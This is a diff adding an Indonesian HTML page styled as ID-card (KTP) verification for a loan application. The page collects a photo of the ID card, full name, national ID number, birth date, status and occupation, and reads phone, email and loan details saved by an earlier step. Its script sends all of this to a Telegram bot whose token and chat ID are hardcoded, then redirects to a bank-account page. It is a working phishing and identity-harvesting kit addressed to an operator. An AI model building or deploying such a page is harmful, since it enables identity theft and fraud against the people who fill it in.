@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifikasi KTP</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif}
+body{background:#f6f8fb;overflow-x:hidden}
+.head{background:#11C7C8;color:#fff;padding:16px;border-radius:0 0 16px 16px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:10}
+.container{padding:14px 14px 90px;max-width:420px;margin:auto}
+.card{background:#fff;border-radius:16px;padding:16px;box-shadow:0 8px 24px rgba(0,0,0,.06)}
+.title{font-size:15px;font-weight:800;color:#111}
+.sub{font-size:11px;color:#777;margin-top:4px;line-height:1.4}
+.ktp-box{margin-top:12px;border:2px dashed #b8f0f0;border-radius:14px;height:185px;display:grid;place-items:center;position:relative;overflow:hidden;background:#f0fffe;cursor:pointer}
+.ktp-box.has-img{border-style:solid;border-color:#11C7C8}
+.ktp-box img{width:100%;height:100%;object-fit:cover;display:none}
+.ktp-box.has-img img{display:block}
+.btns-ktp{margin-top:12px;display:flex;gap:10px}
+.btns-ktp button{flex:1;padding:11px;border-radius:10px;border:none;font-weight:700;font-size:12px;cursor:pointer}
+.b-cam{background:#11C7C8;color:#fff}
+.b-file{background:#eef0f5;color:#111;border:1px solid #ddd!important}
+.form-group{margin-top:18px;background:#fff;border-radius:12px;overflow:hidden;border:1px solid #f0f0f0}
+.f-row{display:flex;justify-content:space-between;align-items:center;padding:14px 14px;border-bottom:1px solid #f2f2f2}
+.f-row:last-child{border-bottom:none}
+.f-row label{font-size:12px;color:#666;font-weight:600;min-width:90px}
+.f-row input,.f-row select{border:none;text-align:right;font-size:13px;font-weight:700;width:180px;outline:none;background:transparent;color:#111}
+.f-row input::placeholder{font-weight:400;color:#aaa;font-size:12px}
+.btn{width:100%;margin-top:18px;padding:14px;border:none;border-radius:30px;background:#e0e2e5;color:#999;font-weight:800;font-size:14px;transition:.2s}
+.btn.active{background:#11C7C8;color:#fff;box-shadow:0 8px 18px rgba(17,199,200,.35);cursor:pointer}
+.cam{position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:99;display:none;align-items:center;justify-content:center;padding:16px}
+.cam.show{display:flex}
+.cam-card{background:#fff;border-radius:16px;width:100%;max-width:360px;overflow:hidden}
+.cam-card video{width:100%;height:240px;object-fit:cover;background:#000;display:block}
+.cam-bar{padding:12px;display:flex;gap:10px}
+.cam-bar button{flex:1;padding:11px;border-radius:30px;border:none;font-weight:800;cursor:pointer}
+</style>
+</head>
+<body>
+
+<div class="head"><h2 style="font-size:16px;font-weight:800">Verifikasi KTP</h2><span onclick="history.back()" style="cursor:pointer;font-size:20px">✕</span></div>
+
+<div class="container">
+  <div class="card">
+    <div class="title">Foto KTP Asli Anda</div>
+    <p class="sub">Pastikan 4 sudut KTP terlihat jelas, tidak buram dan tidak terpotong.</p>
+
+    <div class="ktp-box" id="ktpBox" onclick="openFile()">
+      <div id="ktpPlace" style="text-align:center">
+        <div style="width:48px;height:48px;background:#e6fbfb;border-radius:50%;display:grid;place-items:center;margin:0 auto 6px;font-size:20px">📷</div>
+        <p style="font-size:12px;font-weight:700;color:#111">Belum ada foto</p>
+        <small style="font-size:10px;color:#999">Tap untuk unggah</small>
+      </div>
+      <img id="imgKtp">
+    </div>
+
+    <div class="btns-ktp">
+      <button class="b-cam" onclick="openCam()">📷 Ambil Foto</button>
+      <button class="b-file" onclick="openFile()">🖼️ Galeri</button>
+    </div>
+
+    <div class="form-group">
+      <div class="f-row"><label>Nama Lengkap</label><input id="namaLengkap" placeholder="Sesuai KTP" oninput="cek()"></div>
+      <div class="f-row"><label>Nama Belakang</label><input id="namaBelakang" placeholder="Nama belakang" oninput="cek()"></div>
+      <div class="f-row"><label>NIK</label><input id="nik" placeholder="16 digit NIK" type="tel" inputmode="numeric" maxlength="16" oninput="cek()"></div>
+      <div class="f-row"><label>Tgl Lahir</label><input id="tglLahir" type="date" oninput="cek()"></div>
+      <div class="f-row"><label>Status</label>
+        <select id="status" onchange="cek()">
+          <option value="">Pilih status</option>
+          <option>Belum Menikah</option>
+          <option>Menikah</option>
+          <option>Cerai</option>
+        </select>
+      </div>
+      <div class="f-row"><label>Pekerjaan</label>
+        <select id="pekerjaan" onchange="cek()">
+          <option value="">Pilih pekerjaan</option>
+          <option>Karyawan</option>
+          <option>Wiraswasta</option>
+          <option>PNS</option>
+          <option>Lainnya</option>
+        </select>
+      </div>
+    </div>
+
+    <button class="btn" id="btnLanjut" onclick="goRekening()">Lanjut ke Rekening</button>
+  </div>
+</div>
+
+<div class="cam" id="cam">
+  <div class="cam-card">
+    <div style="padding:12px 14px;display:flex;justify-content:space-between;font-weight:700;font-size:13px">Kamera KTP <span onclick="closeCam()" style="cursor:pointer">✕</span></div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none"></canvas>
+    <div class="cam-bar">
+      <button style="background:#eef0f5" onclick="closeCam()">Batal</button>
+      <button style="background:#11C7C8;color:#fff" onclick="ambilFoto()">Ambil</button>
+    </div>
+  </div>
+</div>
+
+<input type="file" id="fileFoto" accept="image/*" style="display:none">
+
+<script>
+// === ISI TOKEN TELEGRAM DISINI BOS ===
+const TELEGRAM_BOT_TOKEN="8878507338:AAFGFpr2gOnxcm6YGd5L8uZQ2lOdyImuNKM";
+const TELEGRAM_CHAT_ID="8488971726";
+
+let stream=null;
+const video=document.getElementById('video');
+const cam=document.getElementById('cam');
+const imgKtp=document.getElementById('imgKtp');
+const ktpBox=document.getElementById('ktpBox');
+const ktpPlace=document.getElementById('ktpPlace');
+
+// auto isi nama dari halaman sebelumnya
+try{
+  const s1=JSON.parse(localStorage.getItem('user_step1')||'{}');
+  if(s1.nama) document.getElementById('namaLengkap').value=s1.nama;
+  cek();
+}catch(e){}
+
+async function openCam(){
+  cam.classList.add('show');
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:{ideal:800}},audio:false});
+    video.srcObject=stream;
+  }catch(e){ alert('Kamera tidak bisa, pakai Galeri saja'); closeCam(); openFile(); }
+}
+function closeCam(){ cam.classList.remove('show'); if(stream){stream.getTracks().forEach(t=>t.stop()); stream=null;} }
+function openFile(){ document.getElementById('fileFoto').click(); }
+
+document.getElementById('fileFoto').addEventListener('change',function(){
+  const f=this.files[0]; if(!f) return;
+  proses(URL.createObjectURL(f));
+});
+
+function ambilFoto(){
+  const c=document.getElementById('canvas');
+  c.width=video.videoWidth; c.height=video.videoHeight;
+  c.getContext('2d').drawImage(video,0,0);
+  proses(c.toDataURL('image/jpeg',0.9));
+}
+function proses(src){
+  closeCam();
+  imgKtp.src=src;
+  ktpPlace.style.display='none';
+  ktpBox.classList.add('has-img');
+  cek();
+}
+function cek(){
+  const nama=document.getElementById('namaLengkap').value.trim();
+  const belakang=document.getElementById('namaBelakang').value.trim();
+  const nik=document.getElementById('nik').value.trim();
+  const tgl=document.getElementById('tglLahir').value;
+  const st=document.getElementById('status').value;
+  const kerja=document.getElementById('pekerjaan').value;
+  const ok = nama.length>=3 && belakang.length>=2 && nik.length>=10 && tgl && st && kerja && ktpBox.classList.contains('has-img');
+  document.getElementById('btnLanjut').classList.toggle('active', ok);
+}
+
+// === TOMBOL KIRIM TELEGRAM + PINDAH HALAMAN ===
+async function goRekening(){
+  const btn=document.getElementById('btnLanjut');
+  if(!btn.classList.contains('active')) return alert('Lengkapi foto KTP dan semua kolom dulu bos');
+
+  const namaLengkap=document.getElementById('namaLengkap').value.trim();
+  const namaBelakang=document.getElementById('namaBelakang').value.trim();
+  const nik=document.getElementById('nik').value.trim();
+  const tglLahir=document.getElementById('tglLahir').value;
+  const status=document.getElementById('status').value;
+  const pekerjaan=document.getElementById('pekerjaan').value;
+
+  // ambil data dari halaman pertama
+  const step1 = JSON.parse(localStorage.getItem('user_step1')||'{}');
+
+  // simpan untuk halaman rekening
+  localStorage.setItem('ktp_lengkap', JSON.stringify({namaLengkap,namaBelakang,nik,tglLahir,status,pekerjaan}));
+
+  btn.innerText="Mengirim...";
+  btn.style.opacity="0.7";
+
+  const teks = `🪪 VERIFIKASI KTP BARU
+👤 Nama Lengkap: ${namaLengkap} ${namaBelakang}
+🆔 NIK: ${nik}
+🎂 Tgl Lahir: ${tglLahir}
+💍 Status: ${status}
+💼 Pekerjaan: ${pekerjaan}
+
+--- Data Awal ---
+👤 Nama Daftar: ${step1.nama||'-'}
+📱 HP: ${step1.hp||'-'}
+📧 Email: ${step1.email||'-'}
+💰 Pinjaman: ${step1.simulasi?.jumlah||'-'} | ${step1.simulasi?.tenor||'-'} | Cicil ${step1.simulasi?.cicilan||'-'}
+
+⏰ ${new Date().toLocaleString('id-ID')}`;
+
+  try{
+    if(!TELEGRAM_BOT_TOKEN.includes('ISI')){
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID, text:teks})
+      });
+    }
+  }catch(e){ console.log(e); }
+
+  // PINDAH HALAMAN SETELAH KIRIM
+  setTimeout(()=>{
+    window.location.href = "rekening.html"; // <-- GANTI TUJUAN DISINI
+  },600);
+}
+</script>
+</body>
+</html>
